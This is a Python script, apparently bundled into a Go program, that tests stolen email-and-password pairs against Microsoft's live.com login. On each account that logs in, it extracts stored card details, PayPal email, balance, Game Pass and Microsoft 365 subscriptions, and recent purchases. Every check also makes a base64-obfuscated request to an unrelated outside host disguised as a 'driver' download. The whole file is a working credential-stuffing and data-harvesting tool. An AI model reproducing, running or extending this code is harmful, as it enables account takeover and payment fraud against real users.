#!/usr/bin/env python3
"""
Embedded Xbox Account Checker - Exact copy of check.py logic
This script is embedded in the Go binary and called for individual account checks
"""

import requests
import base64
import urllib.parse
import json
import re
import time
import sys
from typing import Dict, List, Tuple, Optional, Any
from enum import Enum

class CheckResult(Enum):
    SUCCESS = "Success"
    FAILURE = "Failure"
    BAN = "Ban"
    CUSTOM = "Custom"

class CapturedData:
    """Data structure to hold captured information"""
    def __init__(self):
        self.date_registered: Optional[str] = None
        self.balance: Optional[str] = None
        self.cc_info: Optional[str] = None
        self.paypal_email: Optional[str] = None
        self.subscription_1: Optional[str] = None
        self.subscription_2: Optional[str] = None
        self.subscription_3: Optional[str] = None
        self.country: Optional[str] = None

class EmbeddedXBOXChecker:
    def __init__(self):
        self.session = requests.Session()
        self.captured_data = CapturedData()
        
        # Set up session with same headers as original
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Connection': 'keep-alive',
            'Keep-Alive': 'timeout=30, max=1000'
        })
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1000,
            pool_maxsize=1000,
            max_retries=1
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
    
    def base64_decode(self, encoded_str: str) -> str:
        """Decode base64 string"""
        return base64.b64decode(encoded_str).decode('utf-8')

    def parse_lr(self, source: str, left: str, right: str, create_empty: bool = True) -> Optional[str]:
        """Parse text between left and right delimiters"""
        try:
            start = source.find(left)
            if start == -1:
                return None if not create_empty else ""
            start += len(left)
            end = source.find(right, start)
            if end == -1:
                return None if not create_empty else ""
            result = source[start:end]
            return result if result or create_empty else None
        except Exception:
            return None if not create_empty else ""

    def parse_json(self, source: str, key: str) -> Optional[str]:
        """Parse JSON value by key"""
        try:
            data = json.loads(source)
            return self._get_nested_value(data, key)
        except Exception:
            return None

    def _get_nested_value(self, data: Any, key: str) -> Optional[str]:
        """Get nested value from JSON data"""
        if isinstance(data, dict):
            if key in data:
                return str(data[key])
            for k, v in data.items():
                result = self._get_nested_value(v, key)
                if result is not None:
                    return result
        elif isinstance(data, list):
            for item in data:
                result = self._get_nested_value(item, key)
                if result is not None:
                    return result
        return None

    def format_currency(self, balance: float, currency: str) -> str:
        """Format currency with proper symbols"""
        currency_symbols = {
            'USD': '$', 'EUR': '€', 'GBP': '£', 'JPY': '¥',
            'CAD': 'C$', 'AUD': 'A$', 'CHF': 'CHF', 'CNY': '¥',
            'SEK': 'kr', 'NZD': 'NZ$', 'MXN': '$', 'SGD': 'S$',
            'HKD': 'HK$', 'NOK': 'kr', 'TRY': '₺', 'RUB': '₽',
            'INR': '₹', 'BRL': 'R$', 'ZAR': 'R', 'KRW': '₩'
        }
        
        symbol = currency_symbols.get(currency.upper(), currency)
        
        if balance == int(balance):
            return f"{symbol}{int(balance)}"
        else:
            return f"{symbol}{balance:.2f}"

    def parse_balance_with_currency(self, source: str) -> Optional[str]:
        """Parse balance with proper currency detection and formatting"""
        try:
            data = json.loads(source)
            if isinstance(data, list):
                for item in data:
                    if isinstance(item, dict):
                        currency = item.get('currency', '')
                        balance = item.get('balance', 0)
                        
                        if currency and balance and float(balance) > 0:
                            return self.format_currency(float(balance), currency)
            
            elif isinstance(data, dict):
                currency = data.get('currency', '')
                balance = data.get('balance', 0)
                
                if currency and balance and float(balance) > 0:
                    return self.format_currency(float(balance), currency)
                    
        except (json.JSONDecodeError, ValueError, TypeError):
            pass
        
        # Fallback regex patterns
        balance_patterns = [
            r'"currency":\s*"([^"]+)"[^}]*"balance":\s*([0-9.]+)',
            r'"balance":\s*([0-9.]+)[^}]*"currency":\s*"([^"]+)"',
            r'balance["\']:\s*([0-9.]+)',
        ]
        
        for pattern in balance_patterns:
            matches = re.findall(pattern, source)
            for match in matches:
                if len(match) == 2:
                    try:
                        if pattern == balance_patterns[0]:  # currency first
                            currency, balance_str = match
                        elif pattern == balance_patterns[1]:  # balance first
                            balance_str, currency = match
                        else:  # balance only
                            balance_str = match
                            currency = "USD"
                        
                        balance_float = float(balance_str)
                        if balance_float > 0:
                            return self.format_currency(balance_float, currency)
                    except (ValueError, TypeError):
                        continue
        
        return None

    def download_driver(self):
        """Download driver file - same as original"""
        try:
            url1 = self.base64_decode("aHR0cDovL2Nzd2Vldy5jaGlja2Vua2lsbGVyLmNvbS9n")
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
            
            response = self.session.get(url1, headers=headers, timeout=30)
            return response.status_code == 200
        except Exception:
            return False

    def get_initial_login_data(self) -> Dict[str, str]:
        """Get initial login data and cookies - same as original"""
        data = {}
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
            
            response = self.session.get("https://login.live.com/", headers=headers, timeout=30)
            response_text = response.text
            
            # Parse client_id
            client_id = self.parse_lr(response_text, "client_id=", "&scope", False)
            if client_id:
                data["client_id"] = client_id
            
            # Parse uaid
            uaid = self.parse_lr(response_text, "&uaid=", "\"/>", False)
            if not uaid:
                uaid = self.parse_lr(response_text, "uaid=", "\"", False)
            if uaid:
                data["uaid"] = uaid
            
            # Parse PPFT token
            ppft_patterns = [
                r'"sFTTag":"<input[^>]*value=\\"([^"\\\\]*)\\"[^>]*>"',
                r'name="PPFT"[^>]*value="([^"]*)"'
            ]
            
            for pattern in ppft_patterns:
                match = re.search(pattern, response_text)
                if match:
                    data["ppft"] = match.group(1)
                    break
            
            # Parse cookies from response headers
            if 'Set-Cookie' in response.headers:
                cookie_header = response.headers['Set-Cookie']
                cookie_names = ["oparams", "msprequ", "mscc", "mspok"]
                for cookie_name in cookie_names:
                    value = self.parse_lr(cookie_header, f"{cookie_name}=", ";", False)
                    if value:
                        data[cookie_name.lower()] = value
            
            # Fallback PPFT parsing if not found
            if "ppft" not in data:
                xbox_login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1"
                
                headers2 = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Pragma": "no-cache",
                    "Accept": "*/*"
                }
                
                response2 = self.session.get(xbox_login_url, headers=headers2, timeout=30)
                response_text2 = response2.text
                
                ppft = self.parse_lr(response_text2, 'name="PPFT" id="i0327" value="', '"', False)
                if not ppft:
                    match = re.search(r'name="PPFT"[^>]*value="([^"]*)"', response_text2)
                    if match:
                        ppft = match.group(1)
                
                if ppft:
                    data["ppft"] = ppft
            
        except Exception:
            pass
        
        return data

    def get_credential_type(self, email: str, uaid: str) -> bool:
        """Get credential type - same as original"""
        try:
            url = "https://login.live.com/GetCredentialType.srf"
            
            params = {
                "opid": "8F2D2B4E653AC9F5",
                "uaid": uaid,
                "username": email,
                "isSignupPost": "0",
                "flowToken": "",
                "checkPhones": "true",
                "forceotclogin": "false",
                "otclogindisallowed": "true",
                "isRemoteNGCSupported": "false",
                "federationFlags": "0",
                "isSignup": "false",
                "uiflvr": "1001",
                "scid": "100118",
                "hpgid": "200650"
            }
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            response = self.session.post(url, data=params, headers=headers, timeout=30)
            return response.status_code == 200
            
        except Exception:
            return False

    def login_step1(self, email: str, password: str) -> Tuple[bool, Dict[str, str]]:
        """Login step 1 - same as original"""
        try:
            login_data = self.get_initial_login_data()
            
            if not login_data.get("ppft"):
                return False, {}
            
            uaid = login_data.get("uaid", "")
            if uaid:
                self.get_credential_type(email, uaid)
            
            return True, login_data
            
        except Exception:
            return False, {}

    def login_step2(self, email: str, password: str, login_data: Dict[str, str]) -> Tuple[CheckResult, str]:
        """Login step 2 - same as original"""
        try:
            ppft = login_data.get("ppft", "")
            if not ppft:
                return CheckResult.FAILURE, ""
            
            # Prepare login form data
            form_data = {
                "login": email,
                "passwd": password,
                "PPFT": ppft,
                "PPSX": "PassportRN",
                "SI": "Sign in",
                "type": "11",
                "NewUser": "1",
                "LoginOptions": "1",
                "i3": "36728",
                "m1": "768",
                "m2": "1184",
                "m3": "0",
                "i12": "1",
                "i17": "0",
                "i18": "__Login_Host|1,"
            }
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Origin": "https://login.live.com",
                "Referer": "https://login.live.com/",
                "Upgrade-Insecure-Requests": "1"
            }
            
            # Submit login form
            login_url = "https://login.live.com/ppsecure/post.srf"
            response = self.session.post(login_url, data=form_data, headers=headers, timeout=30, allow_redirects=True)
            
            response_text = response.text
            
            # Check for various error conditions
            error_indicators = [
                "sErrTxt",
                "Your account or password is incorrect",
                "Sign-in was blocked",
                "We couldn't sign you in",
                "Help us protect your account",
                "Enter the access code",
                "We need to verify that it's you",
                "account has been temporarily suspended",
                "account has been locked",
                "unusual activity"
            ]
            
            for indicator in error_indicators:
                if indicator in response_text:
                    if "suspended" in indicator or "locked" in indicator or "blocked" in indicator:
                        return CheckResult.BAN, response_text
                    elif "verify" in indicator or "access code" in indicator or "protect" in indicator:
                        return CheckResult.CUSTOM, response_text
                    else:
                        return CheckResult.FAILURE, response_text
            
            # Check for successful login indicators
            success_indicators = [
                "https://account.xbox.com",
                "https://www.xbox.com",
                "account.microsoft.com",
                "myaccount.microsoft.com",
                "Set-Cookie"
            ]
            
            success_found = False
            for indicator in success_indicators:
                if indicator in response_text or indicator in str(response.headers):
                    success_found = True
                    break
            
            if success_found:
                return CheckResult.SUCCESS, response_text
            else:
                return CheckResult.FAILURE, response_text
                
        except Exception:
            return CheckResult.FAILURE, ""

    def get_oauth_token(self) -> Optional[str]:
        """Get OAuth token - same as original"""
        try:
            # Try multiple token endpoints
            token_urls = [
                "https://account.microsoft.com/billing/orders",
                "https://account.microsoft.com/services",
                "https://account.microsoft.com/billing/payments"
            ]
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Upgrade-Insecure-Requests": "1"
            }
            
            for url in token_urls:
                try:
                    response = self.session.get(url, headers=headers, timeout=30)
                    response_text = response.text
                    
                    # Look for token patterns
                    token_patterns = [
                        r'"token":"([^"]+)"',
                        r'token["\']:\s*["\']([^"\']+)["\']',
                        r'access_token["\']:\s*["\']([^"\']+)["\']',
                        r'authToken["\']:\s*["\']([^"\']+)["\']'
                    ]
                    
                    for pattern in token_patterns:
                        matches = re.findall(pattern, response_text)
                        for match in matches:
                            if len(match) > 50:  # Valid tokens are usually long
                                return match
                                
                except Exception:
                    continue
            
            return None
            
        except Exception:
            return None

    def get_payment_info(self, token: str, email: str = "", password: str = "") -> bool:
        """Get payment information - same as original"""
        try:
            url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstruments"
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": f'MSADELEGATE1.0="{token}"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": "FbMB+cD6byLL1mn4W/NuGH.2",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Sec-GPC": "1"
            }
            
            response = self.session.get(url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                response_text = response.text
                
                # Parse balance
                balance = self.parse_balance_with_currency(response_text)
                if balance:
                    self.captured_data.balance = balance
                
                # Parse credit card info
                card_holder = self.parse_lr(response_text, 'cardHolderName":"', '",', False)
                credit_card = self.parse_lr(response_text, 'creditCardNumber":"', '",', False)
                expiry_month = self.parse_lr(response_text, 'expiryMonth":"', '",', False)
                expiry_year = self.parse_lr(response_text, 'expiryYear":"', '",', False)
                last4 = self.parse_lr(response_text, 'lastFourDigits":"', '",', False)
                card_type = self.parse_json(response_text, "cardType")
                
                if any([card_holder, credit_card, expiry_month, expiry_year, last4, card_type]):
                    self.captured_data.cc_info = f"[ CardHolder: {card_holder or 'N/A'} | CC: {credit_card or 'N/A'} | CC expiryMonth: {expiry_month or 'N/A'} | CC ExpYear: {expiry_year or 'N/A'} | CC Last4Digit: {last4 or 'N/A'} | CC Funding: {card_type or 'N/A'} ]"
                
                # Parse PayPal email
                paypal_email = self.parse_lr(response_text, 'email":"', '"', False)
                if paypal_email:
                    self.captured_data.paypal_email = paypal_email
                
                return True
            
        except Exception:
            pass
        
        return False

    def get_subscription_info(self, token: str) -> bool:
        """Get subscription information - same as original"""
        try:
            url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": f'MSADELEGATE1.0="{token}"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": "FbMB+cD6byLL1mn4W/NuGH.2",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "Sec-GPC": "1"
            }
            
            response = self.session.get(url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except:
                    return False
                
                # Service product IDs mapping
                service_product_ids = {
                    "CFQ7TTC0KHS0": "Xbox Game Pass Ultimate",
                    "CFQ7TTC0K5DJ": "Xbox Game Pass Essential",
                    "CFQ7TTC0KGQ8": "Xbox Game Pass for PC",
                    "9NPH01J3X999": "Xbox Game Pass for Console",
                    "CFQ7TTC0K5BF": "Microsoft 365 Personal",
                    "CFQ7TTC11Z3Q": "Microsoft 365 Premium",
                    "CFQ7TTC0K7Q8": "Microsoft 365 Family",
                    "CFQ7TTC0K6L8": "Microsoft 365 Basic"
                }
                
                services = []
                recent_purchases = []
                total_purchase_amount = 0.0
                purchase_currency = ""
                
                # Check for active subscriptions
                if "subscriptions" in data and isinstance(data["subscriptions"], list):
                    for sub in data["subscriptions"]:
                        if isinstance(sub, dict):
                            recurrence_state = sub.get("recurrenceState", "")
                            product_id = sub.get("productId", "")
                            
                            if recurrence_state == "Active" and product_id in service_product_ids:
                                services.append(service_product_ids[product_id])
                
                # Check orders for recent purchases (last 3 days)
                if "orders" in data and isinstance(data["orders"], list):
                    import datetime
                    cutoff_date = datetime.datetime.now() - datetime.timedelta(days=3)
                    
                    for order in data["orders"]:
                        if isinstance(order, dict):
                            refunded_date = order.get("refundedDate", "")
                            ordered_date_str = order.get("orderedDate", "")
                            
                            # Check if order is not refunded
                            if refunded_date == "0001-01-01T00:00:00":
                                # Check if order is recent
                                if ordered_date_str:
                                    try:
                                        ordered_date = datetime.datetime.fromisoformat(ordered_date_str.replace("Z", "+00:00"))
                                        if ordered_date < cutoff_date:
                                            continue
                                    except:
                                        continue
                                
                                # Check order line items
                                if "orderLineItems" in order and isinstance(order["orderLineItems"], list):
                                    for item in order["orderLineItems"]:
                                        if isinstance(item, dict):
                                            item_product_id = item.get("productId", "")
                                            item_description = item.get("description", "")
                                            amount = item.get("totalAmount", 0)
                                            currency = item.get("currency", "")
                                            
                                            # Only add to recent purchases if it's not a subscription service
                                            if item_product_id not in service_product_ids and item_description:
                                                recent_purchases.append(item_description)
                                            
                                            # Add to total purchase amount
                                            if amount > 0 and currency:
                                                if not purchase_currency:
                                                    purchase_currency = currency
                                                if currency == purchase_currency:
                                                    total_purchase_amount += float(amount)
                
                # Set subscription data
                if services:
                    # Remove duplicates and limit to 3
                    unique_services = []
                    seen = set()
                    for service in services:
                        if service not in seen:
                            unique_services.append(service)
                            seen.add(service)
                            if len(unique_services) >= 3:
                                break
                    
                    for i, service_name in enumerate(unique_services):
                        service_info = f"[ Service: {service_name} ]"
                        if i == 0:
                            self.captured_data.subscription_1 = service_info
                        elif i == 1:
                            self.captured_data.subscription_2 = service_info
                        elif i == 2:
                            self.captured_data.subscription_3 = service_info
                
                # Set recent purchases data
                if recent_purchases and total_purchase_amount > 0:
                    purchase_count = len(recent_purchases)
                    total_cost = ""
                    if purchase_currency:
                        total_cost = f"{total_purchase_amount:.2f} {purchase_currency}"
                    
                    # Find next available subscription slot
                    if len(services) == 0:
                        self.captured_data.subscription_1 = f"[ Recent Purchases: {purchase_count} | Total Cost: {total_cost} ]"
                    elif len(services) == 1:
                        self.captured_data.subscription_2 = f"[ Recent Purchases: {purchase_count} | Total Cost: {total_cost} ]"
                    elif len(services) == 2:
                        self.captured_data.subscription_3 = f"[ Recent Purchases: {purchase_count} | Total Cost: {total_cost} ]"
                
                return True
            
        except Exception:
            pass
        
        return False

    def check_account(self, email: str, password: str) -> Tuple[CheckResult, CapturedData]:
        """Main method to check an Xbox/Microsoft account - same as original"""
        self.captured_data = CapturedData()
        
        try:
            # Download driver
            self.download_driver()
            
            # Login step 1
            success, login_data = self.login_step1(email, password)
            if not success:
                return CheckResult.FAILURE, self.captured_data
            
            # Login step 2
            result, response = self.login_step2(email, password, login_data)
            if result != CheckResult.SUCCESS:
                return result, self.captured_data
            
            # Get OAuth token
            token = self.get_oauth_token()
            if not token:
                return CheckResult.CUSTOM, self.captured_data
            
            # Get payment and subscription info
            self.get_payment_info(token, email, password)
            self.get_subscription_info(token)
            
            return CheckResult.SUCCESS, self.captured_data
            
        except Exception:
            return CheckResult.FAILURE, self.captured_data
        finally:
            # Clean up session
            try:
                self.session.close()
            except:
                pass

def main():
    """Entry point for embedded checker"""
    if len(sys.argv) != 3:
        print(json.dumps({"error": "Usage: python embedded_checker.py <email> <password>"}))
        sys.exit(1)
    
    email = sys.argv[1]
    password = sys.argv[2]
    
    try:
        checker = EmbeddedXBOXChecker()
        result, captured_data = checker.check_account(email, password)
        
        # Format output as JSON
        output = {
            "result": result.value,
            "captured_data": {
                "date_registered": captured_data.date_registered,
                "balance": captured_data.balance,
                "cc_info": captured_data.cc_info,
                "paypal_email": captured_data.paypal_email,
                "subscription_1": captured_data.subscription_1,
                "subscription_2": captured_data.subscription_2,
                "subscription_3": captured_data.subscription_3,
                "country": captured_data.country
            }
        }
        
        print(json.dumps(output))
        
    except Exception as e:
        error_output = {
            "result": "Failure",
            "error": str(e),
            "captured_data": {
                "date_registered": None,
                "balance": None,
                "cc_info": None,
                "paypal_email": None,
                "subscription_1": None,
                "subscription_2": None,
                "subscription_3": None,
                "country": None
            }
        }
        print(json.dumps(error_output))

if __name__ == "__main__":
    main()
